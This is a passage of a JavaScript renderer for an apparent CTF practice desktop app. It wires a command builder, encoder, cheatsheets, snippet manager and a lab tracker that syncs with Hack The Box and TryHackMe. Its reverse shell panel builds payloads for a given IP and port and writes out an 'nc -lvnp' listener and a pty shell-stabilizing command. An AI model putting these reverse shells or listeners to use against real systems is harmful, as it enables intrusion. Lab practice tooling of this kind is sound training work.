  AppState.snippetSearchOpen = false;
}

function renderSnippetSearchResults(query) {
  const list = $('#global-snippet-results');
  if (!list) return;

  const q = query.toLowerCase();
  const results = AppState.snippetsData.filter(s =>
    !q || s.title.toLowerCase().includes(q) || s.content.toLowerCase().includes(q) || (s.tags || []).some(t => t.toLowerCase().includes(q))
  ).slice(0, 20);

  if (results.length === 0) {
    list.innerHTML = '<div class="snippet-search-empty">No snippets found</div>';
    return;
  }

  list.innerHTML = results.map((s, i) => `
    <div class="snippet-search-item" data-idx="${i}" data-id="${s.id}">
      <span class="snippet-search-title">${escHtml(s.title)}</span>
      <span class="snippet-search-preview">${escHtml((s.content || '').slice(0, 80))}</span>
      ${(s.tags || []).map(t => `<span class="snippet-tag-mini">${escHtml(t)}</span>`).join('')}
    </div>
  `).join('');

  list.querySelectorAll('.snippet-search-item').forEach((el, i) => {
    el.addEventListener('click', () => {
      const snippet = results[i];
      const input = $('#message-input');
      if (input) {
        input.value += snippet.content;
        autoResizeInput(input);
        input.focus();
      }
      closeSnippetSearch();
    });
  });
}

function wireSnippetSearchOverlay() {
  const overlay = $('#snippet-search-overlay');
  if (!overlay) return;

  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) closeSnippetSearch();
  });

  const input = overlay.querySelector('#global-snippet-input');
  if (input) {
    input.addEventListener('input', () => renderSnippetSearchResults(input.value));
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') closeSnippetSearch();
      if (e.key === 'Enter') {
        const first = overlay.querySelector('.snippet-search-item');
        if (first) first.click();
      }
    });
  }

  const closeBtn = overlay.querySelector('.snippet-search-close');
  if (closeBtn) closeBtn.addEventListener('click', closeSnippetSearch);
}

// =============================================================================
// END OF RENDERER PART 2
// Continues in renderer-part3.js
// =============================================================================
// =============================================================================
// RENDERER PART 3 — COMMAND BUILDER, SHELLS, ENCODER, CHEATSHEETS, NOTES,
//                   SNIPPET MANAGER, LAB MODAL, PROGRESS SCREEN,
//                   TRACKER SCREEN, SETTINGS SCREEN, IPC, INIT
// Combine with renderer-part1.js + renderer-part2.js
// =============================================================================

'use strict';

// =============================================================================
// SECTION 3A — COMMAND BUILDER PANEL
// =============================================================================

function wireCommandBuilderPanel() {
  // HTML uses <select> dropdowns — wire them accordingly
  const catSel    = $('#tool-category-select');
  const toolSel   = $('#tool-select');
  const descEl    = $('#tool-description');
  const installEl = $('#tool-install');
  const paramsEl  = $('#tool-params');
  const outputEl  = $('#builder-output');
  const outputWrap= $('#builder-output-wrap');
  const copyBtn   = $('#copy-builder-cmd');

  if (!catSel) return;

  // Populate category <select>
  catSel.innerHTML = '<option value="">Select category...</option>' +
    TOOL_CATEGORIES.map(cat =>
      `<option value="${escHtml(cat.id)}">${escHtml(cat.label)}</option>`
    ).join('');

  // Category → populate tool <select>
  function populateTools(catId) {
    if (!toolSel) return;
    const tools = catId ? TOOLS.filter(t => t.category === catId) : [];
    toolSel.innerHTML = '<option value="">Select tool...</option>' +
      tools.map(t => `<option value="${escHtml(t.id)}">${escHtml(t.label)}</option>`).join('');
    if (paramsEl) paramsEl.innerHTML = '';
    if (outputWrap) outputWrap.style.display = 'none';
    if (descEl) descEl.textContent = '';
    if (installEl) installEl.textContent = '';
  }

  catSel.addEventListener('change', () => populateTools(catSel.value));

  // Tool → render params
  if (toolSel) {
    toolSel.addEventListener('change', () => {
      const tool = TOOLS.find(t => t.id === toolSel.value);
      if (!tool) { if (paramsEl) paramsEl.innerHTML = ''; return; }
      if (descEl) descEl.textContent = tool.description || '';
      if (installEl) installEl.textContent = tool.install ? `Install: ${tool.install}` : '';
      renderToolParams(tool);
    });
  }

  function renderParamField(p) {
    const label = `<label class="param-label" for="param-${escHtml(p.id)}">${escHtml(p.label)}${p.required ? ' *' : ''}</label>`;
    let input = '';
    if (p.type === 'select') {
      input = `<select class="tool-select param-input" data-param="${escHtml(p.id)}" id="param-${escHtml(p.id)}">
        ${(p.options || []).map(o => `<option value="${escHtml(o.value || o)}">${escHtml(o.label || o)}</option>`).join('')}
      </select>`;
    } else if (p.type === 'checkbox') {
      input = `<input type="checkbox" data-param="${escHtml(p.id)}" id="param-${escHtml(p.id)}" ${p.default ? 'checked' : ''}>`;
    } else if (p.type === 'textarea') {
      input = `<textarea class="param-input" data-param="${escHtml(p.id)}" id="param-${escHtml(p.id)}" placeholder="${escHtml(p.placeholder || '')}" rows="3"></textarea>`;
    } else {
      input = `<input type="text" class="param-input" data-param="${escHtml(p.id)}" id="param-${escHtml(p.id)}" placeholder="${escHtml(p.placeholder || p.default || '')}" value="${escHtml(p.default || '')}">`;
    }
    return `<div class="param-field" style="margin-bottom:6px">${label}${input}${p.hint ? `<div style="font-size:10px;color:var(--text-muted);margin-top:2px">${escHtml(p.hint)}</div>` : ''}</div>`;
  }

  function renderToolParams(tool) {
    if (!paramsEl) return;
    paramsEl.innerHTML = (tool.params || []).map(p => renderParamField(p)).join('') +
      `<button class="btn primary" id="cmd-build-btn" style="width:100%;margin-top:8px">⚡ Build Command</button>`;

    // Pre-fill target IP
    const activeTab = getActiveTab();
    if (activeTab?.session?.targetIp) {
      const ipInput = paramsEl.querySelector('[data-param="ip"],[data-param="target"],[data-param="host"]');
      if (ipInput) ipInput.value = activeTab.session.targetIp;
    }

    const buildBtn = paramsEl.querySelector('#cmd-build-btn');
    if (buildBtn) {
      buildBtn.addEventListener('click', () => {
        const vals = {};
        paramsEl.querySelectorAll('[data-param]').forEach(el => {
          vals[el.dataset.param] = el.type === 'checkbox' ? el.checked : el.value;
        });
        const cmd = tool.buildCommand ? tool.buildCommand(vals) : (tool.cmd || '');
        if (outputEl) {
          outputEl.textContent = cmd;
          if (typeof hljs !== 'undefined') hljs.highlightElement(outputEl);
        }
        if (outputWrap) outputWrap.style.display = '';
        if (copyBtn) copyBtn.dataset.cmd = cmd;
        if (AppState.config.soundEnabled) Sounds.click();
      });
    }
  }

  if (copyBtn) {
    copyBtn.addEventListener('click', () => {
      const cmd = copyBtn.dataset.cmd || outputEl?.textContent || '';
      copyToClipboard(cmd, copyBtn);
    });
  }

  // Click output to copy
  if (outputEl) {
    outputEl.addEventListener('click', () => {
      if (outputEl.textContent) copyToClipboard(outputEl.textContent);
    });
  }
}

// =============================================================================
// SECTION 3B — REVERSE SHELL PANEL
// =============================================================================

function wireRevshellPanel() {
  const langSel = $('#revshell-lang');
  const ipInput = $('#revshell-ip');
  const portInput = $('#revshell-port');
  const encSel = $('#revshell-encoding');
  const generateBtn = $('#generate-revshell-btn');
  const outputEl = $('#revshell-payload-out');
  const copyBtn = $('#copy-revshell-payload');

  if (!langSel) return;

  // Populate language list
  langSel.innerHTML = SHELL_LANGUAGES.map(lang => `
    <option value="${escHtml(lang.id)}">${escHtml(lang.label)}</option>
  `).join('');

  // Pre-fill IP from session
  if (ipInput) {
    const tab = getActiveTab();
    if (tab?.session?.targetIp && !ipInput.value) {
      // Use a common tun0 placeholder
      ipInput.placeholder = tab.session.targetIp || '10.10.14.1';
    }
  }

  function generate() {
    const lang = langSel.value;
    const ip = ipInput?.value?.trim() || '10.10.14.1';
    const port = portInput?.value?.trim() || '4444';
    const encode = encSel?.value || 'raw';

    if (!ip) { showToast('Enter your IP address', 'warning'); return; }
    if (!port) { showToast('Enter a port', 'warning'); return; }

    const shell = generateShell(lang, ip, port);
    const encoded = encodeShell(shell, encode);
    const listener = `nc -lvnp ${port}`;
    const stable = `python3 -c 'import pty;pty.spawn("/bin/bash")'\nexport TERM=xterm\n# Ctrl+Z, then: stty raw -echo; fg`;

    // Populate all three output blocks
    const payloadEl  = $('#revshell-payload-out');
    const listenerEl = $('#revshell-listener-out');
    const stableEl   = $('#revshell-stable-out');
    const outputsEl  = $('#revshell-outputs');
    const labelEl    = $('#revshell-lang-label');

    if (payloadEl)  { payloadEl.textContent  = encoded;  if (typeof hljs !== 'undefined') hljs.highlightElement(payloadEl); }
    if (listenerEl) { listenerEl.textContent = listener; if (typeof hljs !== 'undefined') hljs.highlightElement(listenerEl); }
    if (stableEl)   { stableEl.textContent   = stable;   if (typeof hljs !== 'undefined') hljs.highlightElement(stableEl); }
    if (outputsEl)  { outputsEl.style.display = ''; }
    if (labelEl)    { labelEl.textContent = lang; }
    if (copyBtn)    { copyBtn.dataset.shell = encoded; }

    // Wire stable copy button
    const stableCopy = $('#copy-revshell-stable');
    if (stableCopy && !stableCopy._wired) {
      stableCopy.addEventListener('click', () => copyToClipboard(stable));
      stableCopy._wired = true;
    }
  }

  if (generateBtn) generateBtn.addEventListener('click', generate);

  if (copyBtn) {
    copyBtn.addEventListener('click', () => {
      const shell = copyBtn.dataset.shell || outputEl?.textContent || '';
      copyToClipboard(shell, copyBtn);
    });
  }

  // Send to chat
  const chatBtn = $('#revshell-note');
  if (chatBtn) {
    chatBtn.addEventListener('click', () => {
      const shell = chatBtn.dataset.shell || outputEl?.textContent || '';
      if (shell) sendChatMessage(`Here is my reverse shell payload:\n\`\`\`bash\n${shell}\n\`\`\`\nHow should I set up my listener and deliver this?`);
    });
  }

  // NC listener button
  const listenerBtn = $('#copy-revshell-listener');
  if (listenerBtn) {
    listenerBtn.addEventListener('click', () => {
      const port = portInput?.value?.trim() || '4444';
      const cmd = `nc -lvnp ${port}`;
      if (outputEl) outputEl.textContent = cmd;
      if (copyBtn) copyBtn.dataset.shell = cmd;
      copyToClipboard(cmd);
      showToast('Listener command copied!', 'success', 1500);
    });
  }

  // Auto-generate on change
  [langSel, encSel].forEach(el => el?.addEventListener('change', generate));
}

// =============================================================================
// SECTION 3C — ENCODER PANEL
// =============================================================================

function wireEncoderPanel() {
  const inputEl = $('#encode-input');
  const outputEl = $('#encode-output');
  const opSel = $('#encode-operation');
  const runBtn = $('#encode-run-btn');
  const copyBtn = $('#copy-encode-output');
  const swapBtn = $('#encode-swap-btn');
  const clearBtn = $('#enc-clear-placeholder');

  // Chain mode selects
  const chain1 = $('#chain-op-1');
  const chain2 = $('#chain-op-2');
  const chain3 = $('#chain-op-3');
  const chainRunBtn = $('#chain-run-btn');

  const ENCODER_OPS = [
    { id: '', label: '— Select Operation —' },
    { id: 'b64-encode', label: 'Base64 Encode' },
    { id: 'b64-decode', label: 'Base64 Decode' },
    { id: 'url-encode', label: 'URL Encode' },
    { id: 'url-decode', label: 'URL Decode' },
    { id: 'html-encode', label: 'HTML Encode' },
    { id: 'html-decode', label: 'HTML Decode' },
    { id: 'hex-encode', label: 'Hex Encode' },
    { id: 'hex-decode', label: 'Hex Decode' },
    { id: 'rot13', label: 'ROT13' },
    { id: 'binary-encode', label: 'Text → Binary' },
    { id: 'binary-decode', label: 'Binary → Text' },
    { id: 'decimal-to-hex', label: 'Decimal → Hex' },
    { id: 'hex-to-decimal', label: 'Hex → Decimal' },
    { id: 'md5', label: 'MD5 Hash' },
    { id: 'sha1', label: 'SHA1 Hash' },
    { id: 'sha256', label: 'SHA256 Hash' },
    { id: 'jwt-decode', label: 'JWT Decode' },
  ];

  const optionsHtml = ENCODER_OPS.map(o => `<option value="${o.id}">${escHtml(o.label)}</option>`).join('');

  if (opSel) opSel.innerHTML = optionsHtml;
  [chain1, chain2, chain3].forEach(sel => { if (sel) sel.innerHTML = optionsHtml; });

  async function runEncoder() {
    const input = inputEl?.value || '';
    const op = opSel?.value;
    if (!op) { showToast('Select an operation', 'warning'); return; }
    if (!input && op !== 'jwt-decode') { showToast('Enter input text', 'warning'); return; }
    try {
      const result = await applyEncoderOp(op, input);
      if (outputEl) outputEl.value = result;
      if (copyBtn) copyBtn.dataset.result = result;
    } catch (e) {
      if (outputEl) outputEl.value = `Error: ${e.message}`;
    }
  }

  if (runBtn) runBtn.addEventListener('click', runEncoder);

  if (copyBtn) {
    copyBtn.addEventListener('click', () => {
      const result = copyBtn.dataset.result || outputEl?.value || '';
      copyToClipboard(result, copyBtn);
    });
  }

  if (swapBtn) {
    swapBtn.addEventListener('click', () => {
      if (!inputEl || !outputEl) return;
      const tmp = inputEl.value;
      inputEl.value = outputEl.value;
      outputEl.value = tmp;
    });
  }

  if (clearBtn) {
    clearBtn.addEventListener('click', () => {
      if (inputEl) inputEl.value = '';
      if (outputEl) outputEl.value = '';
    });
  }

  // Chain mode
  if (chainRunBtn) {
    chainRunBtn.addEventListener('click', async () => {
      const input = inputEl?.value || '';
      const ops = [chain1?.value, chain2?.value, chain3?.value].filter(Boolean);
      if (ops.length === 0) { showToast('Select at least one chain operation', 'warning'); return; }
      try {
        const { final, steps } = await applyEncoderChain(ops, input);
        if (outputEl) {
          outputEl.value = final || '';
        }
        // Show steps
        const stepsEl = $('#chain-mode-panel');
        if (stepsEl) {
          stepsEl.innerHTML = steps.map((s, i) => `
            <div class="chain-step ${s.error ? 'chain-step-err' : ''}">
              <span class="chain-step-num">${i + 1}</span>
              <span class="chain-step-op">${escHtml(s.op)}</span>
              ${s.error ? `<span class="chain-step-err-msg">Error: ${escHtml(s.error)}</span>` : `<span class="chain-step-result">${escHtml((s.result || '').slice(0, 60))}${(s.result || '').length > 60 ? '…' : ''}</span>`}
            </div>
          `).join('');
        }
      } catch (e) {
        if (outputEl) outputEl.value = `Chain error: ${e.message}`;
      }
    });
  }

  // Quick action buttons (common patterns)
  const quickBtns = $$('.enc-quick-btn');
  quickBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      if (opSel) opSel.value = btn.dataset.op || '';
      runEncoder();
    });
  });
}

// Helper to delegate to inlined applyEncoderOp
async function applyEncoderChain(ops, input) {
  let result = input;
  const steps = [];
  for (const op of ops) {
    try {
      result = await applyEncoderOp(op, result);
      steps.push({ op, result, error: null });
    } catch (e) {
      steps.push({ op, result: null, error: e.message });
      break;
    }
  }
  return { final: result, steps };
}

// =============================================================================
// SECTION 3D — CHEATSHEET PANEL
// =============================================================================

function wireCheatsheetPanel() {
  const topicSel = $('#cheatsheet-select');
  const container = $('#cheatsheet-content');
  const searchInput = $('#cheatsheet-search-placeholder');
  const portLookupInput = $('#port-lookup-input');
  const portLookupResult = $('#port-lookup-result');

  if (!topicSel) return;

  const topics = Object.keys(CHEATSHEETS);
  topicSel.innerHTML = topics.map(t => `<option value="${t}">${escHtml(CHEATSHEETS[t].title || t)}</option>`).join('');

  function renderCheatsheet(topic, query) {
    if (!container) return;
    const sheet = CHEATSHEETS[topic];
    if (!sheet) { container.innerHTML = '<div class="cs-empty">Select a topic</div>'; return; }

    const q = (query || '').toLowerCase();

    let html = `<div class="cs-title">${escHtml(sheet.title)}</div>`;

    (sheet.sections || []).forEach(section => {
      const sectionHeading = section.heading || section.title || '';
      const sectionMatches = !q || sectionHeading.toLowerCase().includes(q);
      const filteredItems = (section.items || []).filter(item => {
        const itemKey = item.flag || item.cmd || '';
        return !q || sectionMatches || itemKey.toLowerCase().includes(q) || (item.desc || '').toLowerCase().includes(q);
      });
      if (filteredItems.length === 0 && !sectionMatches) return;

      html += `<div class="cs-section">
        <div class="cs-section-title">${escHtml(sectionHeading)}</div>
        ${filteredItems.map(item => {
          const itemKey = item.flag || item.cmd || '';
          return `
          <div class="cs-item">
            <div class="cs-item-cmd">
              <code>${escHtml(itemKey)}</code>
              <button class="cs-copy-btn" data-cmd="${escHtml(itemKey)}" title="Copy">⧉</button>
              <button class="cs-chat-btn" data-cmd="${escHtml(itemKey)}" title="Discuss in chat">💬</button>
            </div>
            ${item.desc ? `<div class="cs-item-desc">${escHtml(item.desc)}</div>` : ''}
          </div>`;
        }).join('')}
      </div>`;
    });

    container.innerHTML = html;

    container.querySelectorAll('.cs-copy-btn').forEach(btn => {
      btn.addEventListener('click', () => copyToClipboard(btn.dataset.cmd, btn));
    });
    container.querySelectorAll('.cs-chat-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        sendChatMessage(`Explain this command and when I should use it:\n\`\`\`bash\n${btn.dataset.cmd}\n\`\`\``);
      });
    });
  }

  topicSel.addEventListener('change', () => renderCheatsheet(topicSel.value, searchInput?.value));
  if (searchInput) searchInput.addEventListener('input', () => renderCheatsheet(topicSel.value, searchInput.value));

  // Port lookup
  if (portLookupInput) {
    portLookupInput.addEventListener('input', () => {
      const port = portLookupInput.value.trim();
      if (!portLookupResult) return;
      if (!port) { portLookupResult.textContent = ''; return; }
      const service = PORT_SERVICES[port] || 'Unknown service';
      portLookupResult.innerHTML = `<strong>Port ${escHtml(port)}:</strong> ${escHtml(service)}`;
    });
  }

  // Render first topic
  if (topics.length > 0) renderCheatsheet(topics[0]);
}

// =============================================================================
// SECTION 3E — NOTES PANEL
// =============================================================================

function wireNotesPanel() {
  const notesArea = $('#session-notes-area');
  const saveNoteBtn = $('#save-notes-btn');

  if (!notesArea) return;

  // Load notes from active tab's session
  const tab = getActiveTab();
  if (tab?.session?.notes) notesArea.value = tab.session.notes;

  if (saveNoteBtn) {
    saveNoteBtn.addEventListener('click', async () => {
      const tab = getActiveTab();
      if (!tab?.session) return;
      tab.session.notes = notesArea.value;
      await autoSaveTab(tab);
      showToast('Notes saved', 'success', 1500);
    });
  }

  // Auto-save notes on blur
  notesArea.addEventListener('blur', () => {
    const tab = getActiveTab();
    if (tab?.session) {
      tab.session.notes = notesArea.value;
    }
  });

  // When tab switches, update notes
  document.addEventListener('tabSwitched', () => {
    const tab = getActiveTab();
    if (notesArea && tab?.session) notesArea.value = tab.session.notes || '';
  });
}

// =============================================================================
// SECTION 3F — SNIPPET MANAGER
// =============================================================================

function wireSnippetModal() {
  const modal = $('#snippet-modal');
  if (!modal) return;

  const titleInput = modal.querySelector('#snippet-name');
  const contentInput = modal.querySelector('#snippet-command');
  const tagsInput = modal.querySelector('#snippet-tags');
  const saveBtn = modal.querySelector('#save-snippet-btn');

  if (saveBtn) {
    saveBtn.addEventListener('click', () => {
      const title = (titleInput?.value || '').trim();
      const content = (contentInput?.value || '').trim();
      if (!title || !content) { showToast('Title and content required', 'warning'); return; }
      const tags = (tagsInput?.value || '').split(',').map(t => t.trim()).filter(Boolean);

      const editId = modal.dataset.editId;
      if (editId) {
        const idx = AppState.snippetsData.findIndex(s => s.id === editId);
        if (idx !== -1) {
          AppState.snippetsData[idx] = { ...AppState.snippetsData[idx], title, content, tags, updatedAt: Date.now() };
        }
        delete modal.dataset.editId;
      } else {
        AppState.snippetsData.push({ id: generateId(), title, content, tags, createdAt: Date.now() });
      }

      saveSnippetsData();
      renderSnippetsScreen();
      hideModal('snippet-modal');
      showToast('Snippet saved', 'success', 1500);
    });
  }
}

function openSnippetEditModal(snippet) {
  const modal = $('#snippet-modal');
  if (!modal) return;
  const titleInput = modal.querySelector('#snippet-name');
  const contentInput = modal.querySelector('#snippet-command');
  const tagsInput = modal.querySelector('#snippet-tags');

  if (titleInput) titleInput.value = snippet.title || '';
  if (contentInput) contentInput.value = snippet.content || '';
  if (tagsInput) tagsInput.value = (snippet.tags || []).join(', ');
  modal.dataset.editId = snippet.id;

  const heading = modal.querySelector('.modal-title');
  if (heading) heading.textContent = 'Edit Snippet';

  showModal('snippet-modal');
}

function renderSnippetsScreen() {
  const container = $('#snippets-list');
  if (!container) return;

  const q = ($('#snippets-search')?.value || '').toLowerCase();
  const filtered = AppState.snippetsData.filter(s =>
    !q || s.title.toLowerCase().includes(q) || s.content.toLowerCase().includes(q) || (s.tags || []).some(t => t.toLowerCase().includes(q))
  );

  if (filtered.length === 0) {
    container.innerHTML = '<div class="snippets-empty">No snippets yet. Create one with the + button above.</div>';
    return;
  }

  container.innerHTML = filtered.map(s => `
    <div class="snippet-card" data-id="${s.id}">
      <div class="snippet-card-header">
        <span class="snippet-card-title">${escHtml(s.title)}</span>
        <div class="snippet-card-actions">
          <button class="snip-copy-btn" data-id="${s.id}" title="Copy">⧉</button>
          <button class="snip-chat-btn" data-id="${s.id}" title="Send to chat">💬</button>
          <button class="snip-edit-btn" data-id="${s.id}" title="Edit">✏️</button>
          <button class="snip-del-btn" data-id="${s.id}" title="Delete">🗑</button>
        </div>
      </div>
      <div class="snippet-card-body"><pre class="snippet-preview">${escHtml((s.content || '').slice(0, 200))}${(s.content || '').length > 200 ? '…' : ''}</pre></div>
      ${s.tags?.length ? `<div class="snippet-tags">${s.tags.map(t => `<span class="snippet-tag">${escHtml(t)}</span>`).join('')}</div>` : ''}
    </div>
  `).join('');

  container.querySelectorAll('.snip-copy-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const s = AppState.snippetsData.find(x => x.id === btn.dataset.id);
      if (s) copyToClipboard(s.content, btn);
    });
  });
  container.querySelectorAll('.snip-chat-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const s = AppState.snippetsData.find(x => x.id === btn.dataset.id);
      if (s) {
        const input = $('#message-input');
        if (input) { input.value += s.content; autoResizeInput(input); input.focus(); }
        switchScreen('lab');
      }
    });
  });
  container.querySelectorAll('.snip-edit-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const s = AppState.snippetsData.find(x => x.id === btn.dataset.id);
      if (s) openSnippetEditModal(s);
    });
  });
  container.querySelectorAll('.snip-del-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      showConfirm('Delete this snippet?', (ok) => {
        if (!ok) return;
        AppState.snippetsData = AppState.snippetsData.filter(x => x.id !== btn.dataset.id);
        saveSnippetsData();
        renderSnippetsScreen();
      });
    });
  });
}

function wireSnippetsScreen() {
  const addBtn = $('#add-snippet-btn');
  if (addBtn) {
    addBtn.addEventListener('click', () => {
      const modal = $('#snippet-modal');
      if (modal) {
        modal.dataset.editId = '';
        const titleInput = modal.querySelector('#snippet-name');
        const contentInput = modal.querySelector('#snippet-command');
        const tagsInput = modal.querySelector('#snippet-tags');
        if (titleInput) titleInput.value = '';
        if (contentInput) contentInput.value = '';
        if (tagsInput) tagsInput.value = '';
        const heading = modal.querySelector('.modal-title');
        if (heading) heading.textContent = 'New Snippet';
      }
      showModal('snippet-modal');
    });
  }

  const searchInput = $('#snippets-search');
  if (searchInput) searchInput.addEventListener('input', renderSnippetsScreen);

  renderSnippetsScreen();
}

// =============================================================================
// SECTION 3G — LAB MODAL (Kanban Card Detail)
// =============================================================================

function wireLabModal() {
  const modal = $('#lab-modal');
  if (!modal) return;

  const saveBtn = modal.querySelector('#save-lab-confirm');
  if (saveBtn) {
    saveBtn.addEventListener('click', () => {
      const id = modal.dataset.cardId;
      const col = modal.dataset.cardCol;
      if (!id || !col) return;

      const colData = AppState.labsData.columns[col];
      if (!colData) return;
      const card = colData.cards.find(c => c.id === id);
      if (!card) return;

      card.name = modal.querySelector('#lab-name-input')?.value?.trim() || card.name;
      card.platform = modal.querySelector('#lab-platform-input')?.value || card.platform;
      card.difficulty = modal.querySelector('#lab-difficulty-input')?.value || card.difficulty;
      card.ip = modal.querySelector('#lab-notes-input')?.value?.trim() || '';
      card.os = modal.querySelector('#lab-modal-os')?.value?.trim() || '';
      card.notes = modal.querySelector('#lab-notes-input')?.value || '';
      card.url = modal.querySelector('#lab-url-input')?.value?.trim() || '';

      saveLabTrackerData();
      renderTrackerScreen();
      hideModal('lab-modal');
      showToast('Lab updated', 'success', 1500);
    });
  }

  const startBtn = modal.querySelector('#lab-modal-start-placeholder');
  if (startBtn) {
    startBtn.addEventListener('click', () => {
      const id = modal.dataset.cardId;
      const col = modal.dataset.cardCol;
      if (!id) return;

      // Find card across all columns
      let card = null;
      for (const colData of Object.values(AppState.labsData.columns)) {
        card = colData.cards.find(c => c.id === id);
        if (card) break;
      }
      if (!card) return;

      // Create new session from lab card
      const sessionData = createSession({
        name: card.name,
        target: card.name,
        platform: card.platform || 'HTB',
        difficulty: card.difficulty || 'Medium',
        targetIp: card.ip || '',
        targetOs: card.os || '',
        notes: card.notes || '',
      });

      hideModal('lab-modal');
      const tabId = createTab(sessionData);
      switchScreen('lab');
      if (tabId) showToast(`Session started for ${card.name}`, 'success');

      // Move card to In Progress
      labMoveCard(id, col, 'inprogress');
    });
  }

  const deleteBtn = modal.querySelector('#lab-modal-delete-placeholder');
  if (deleteBtn) {
    deleteBtn.addEventListener('click', () => {
      const id = modal.dataset.cardId;
      const col = modal.dataset.cardCol;
      showConfirm('Delete this lab card?', (ok) => {
        if (!ok) return;
        const colData = AppState.labsData.columns[col];
        if (colData) colData.cards = colData.cards.filter(c => c.id !== id);
        saveLabTrackerData();
        renderTrackerScreen();
        hideModal('lab-modal');
      });
    });
  }
}

function openLabModal(cardId, colId) {
  const colData = AppState.labsData.columns[colId];
  if (!colData) return;
  const card = colData.cards.find(c => c.id === cardId);
  if (!card) return;

  const modal = $('#lab-modal');
  if (!modal) return;

  modal.dataset.cardId = cardId;
  modal.dataset.cardCol = colId;

  const nameInput = modal.querySelector('#lab-name-input');
  const platformSel = modal.querySelector('#lab-platform-input');
  const difficultySel = modal.querySelector('#lab-difficulty-input');
  const ipInput = modal.querySelector('#lab-notes-input');
  const osInput = modal.querySelector('#lab-modal-os');
  const notesArea = modal.querySelector('#lab-notes-input');
  const urlInput = modal.querySelector('#lab-url-input');

  if (nameInput) nameInput.value = card.name || '';
  if (platformSel) platformSel.value = card.platform || 'HTB';
  if (difficultySel) difficultySel.value = card.difficulty || 'Medium';
  if (ipInput) ipInput.value = card.ip || '';
  if (osInput) osInput.value = card.os || '';
  if (notesArea) notesArea.value = card.notes || '';
  if (urlInput) urlInput.value = card.url || '';

  showModal('lab-modal');
}

// =============================================================================
// SECTION 3H — BULK IMPORT MODAL
// =============================================================================

function wireBulkImportModal() {
  const modal = $('#bulk-import-modal');
  if (!modal) return;

  const importBtn = modal.querySelector('#bulk-import-btn');
  const textarea = modal.querySelector('#bulk-import-text');
  const platformSel = modal.querySelector('#bulk-import-platform');

  if (importBtn) {
    importBtn.addEventListener('click', () => {
      const text = (textarea?.value || '').trim();
      if (!text) { showToast('Paste machine names first', 'warning'); return; }

      const platform = platformSel?.value || 'HTB';
      const lines = text.split('\n').map(l => l.trim()).filter(Boolean);

      lines.forEach(line => {
        // Format: "Name,Difficulty" or just "Name"
        const [name, diff] = line.split(',').map(s => s.trim());
        const card = {
          id: generateId(),
          name: name || line,
          platform,
          difficulty: diff || 'Medium',
          ip: '',
          os: '',
          notes: '',
          url: '',
          createdAt: Date.now(),
        };
        AppState.labsData.columns.backlog.cards.push(card);
      });

      saveLabTrackerData();
      renderTrackerScreen();
      hideModal('bulk-import-modal');
      if (textarea) textarea.value = '';
      showToast(`Imported ${lines.length} labs to Backlog`, 'success');
    });
  }
}

// =============================================================================
// SECTION 3I — TRACKER SCREEN (Kanban)
// =============================================================================

function wireTrackerScreen() {
  // ── Back button ───────────────────────────────────────────────────────────────
  const trackerBack = $('#tracker-back-btn');
  if (trackerBack && !trackerBack._wired) {
    trackerBack._wired = true;
    trackerBack.addEventListener('click', () => switchScreen('dashboard'));
  }

  // ── Add Lab button — opens modal for backlog (Want to Do) column ──────────────
  const addBtn = $('#add-lab-btn');
  if (addBtn && !addBtn._wired) {
    addBtn._wired = true;
    addBtn.addEventListener('click', () => showAddLabCardModal('backlog'));
  }

  // ── Bulk Import button ────────────────────────────────────────────────────────
  const bulkBtn = $('#bulk-import-btn');
  if (bulkBtn && !bulkBtn._wired) {
    bulkBtn._wired = true;
    bulkBtn.addEventListener('click', () => showModal('bulk-import-modal'));
  }

  // ── HTB Sync button ───────────────────────────────────────────────────────────
  const syncHTBBtn = $('#sync-htb-btn');
  if (syncHTBBtn && !syncHTBBtn._wired) {
    syncHTBBtn._wired = true;
    syncHTBBtn.addEventListener('click', async () => {
      setButtonLoading(syncHTBBtn, true, 'Syncing…');
      try {
        const result = await window.electronAPI.syncHTB(AppState.config.htbApiKey || '');
        if (!result.success) throw new Error(result.error || 'Unknown error');
        const labs = result.labs || [];
        if (labs.length > 0) {
          let added = 0;
          labs.forEach(lab => {
            const exists = Object.values(AppState.labsData.columns).some(
              col => col.cards.some(c => c.name === lab.name && c.platform === 'HTB')
            );
            if (!exists) {
              AppState.labsData.columns.completed.cards.push({ id: generateId(), ...lab, createdAt: Date.now() });
              added++;
            }
          });
          saveLabTrackerData();
          renderTrackerScreen();
          if (added > 0) {
            showToast(`Synced ${added} new HTB machine${added !== 1 ? 's' : ''}${result.partial ? ' (recent activity)' : ''}`, 'success');
          } else if (labs.length > 0) {
            showToast(`All ${labs.length} HTB machines already in tracker`, 'info');
          }
          if (result.partial && result.partialMsg) {
            setTimeout(() => showToast(result.partialMsg, 'info', 8000), 1200);
          }
        } else {
          if (result.partial && result.partialMsg) {
            showToast(result.partialMsg, 'info', 8000);
          } else {
            showToast('No HTB machines found — check your API key in Settings', 'info');
          }
        }
      } catch (e) {
        showToast('HTB sync failed: ' + e.message, 'error');
      }
      setButtonLoading(syncHTBBtn, false);
    });
  }

  // ── THM Sync button ───────────────────────────────────────────────────────────
  const syncTHMBtn = $('#sync-thm-btn');
  if (syncTHMBtn && !syncTHMBtn._wired) {
    syncTHMBtn._wired = true;
    syncTHMBtn.addEventListener('click', async () => {
      setButtonLoading(syncTHMBtn, true, 'Syncing…');
      try {
        const result = await window.electronAPI.syncTHM(AppState.config.thmUsername || '');
        if (!result.success) throw new Error(result.error || 'Unknown error');
        const labs = result.labs || [];
        if (labs.length > 0) {
          let added = 0;
          labs.forEach(lab => {
            const exists = Object.values(AppState.labsData.columns).some(
              col => col.cards.some(c => c.name === lab.name && c.platform === 'THM')
            );
            if (!exists) {
              AppState.labsData.columns.completed.cards.push({ id: generateId(), ...lab, createdAt: Date.now() });
              added++;
            }
          });
          saveLabTrackerData();
          renderTrackerScreen();
          showToast(added > 0
            ? `Synced ${added} new THM rooms (${labs.length} total completed)`
            : `All ${labs.length} THM rooms already in tracker`, 'success');
        } else {
          showToast('No THM rooms found — check your username in Settings', 'info');
        }
      } catch (e) {
        showToast('THM sync failed: ' + e.message, 'error');
      }
      setButtonLoading(syncTHMBtn, false);
    });
  }

  // ── Search ────────────────────────────────────────────────────────────────────
